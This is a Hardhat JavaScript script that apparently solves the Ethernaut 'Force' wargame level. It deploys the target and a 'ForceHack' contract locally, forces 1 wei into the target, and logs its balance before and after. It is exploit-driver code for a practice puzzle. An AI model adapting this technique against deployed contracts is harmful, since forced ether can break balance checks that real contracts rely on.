const { network, deployments, ethers, getNamedAccounts } = require("hardhat");

async function main() {
  const [owner, addr1, addr2] = await ethers.getSigners();

  const Force = await ethers.getContractFactory("Force");
  const force = await Force.deploy();
  await force.deployed();

  console.log("force addr : ", force.address);

  const ForceHack = await ethers.getContractFactory("ForceHack");
  const forceHack = await ForceHack.deploy();
  await forceHack.deployed();

  const hackerForce = await Force.connect(addr1);
  const hackerForceHack = await forceHack.connect(addr1);

  // ------------ let's hack -------------

  console.log(
    "Force balance : ",
    await ethers.provider.getBalance(force.address)
  );

  await hackerForceHack.send(force.address, { value: "1" });

  console.log(
    "Force balance : ",
    await ethers.provider.getBalance(force.address)
  );
}

// hh run scripts/ethernaut1.js --network hardhat
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
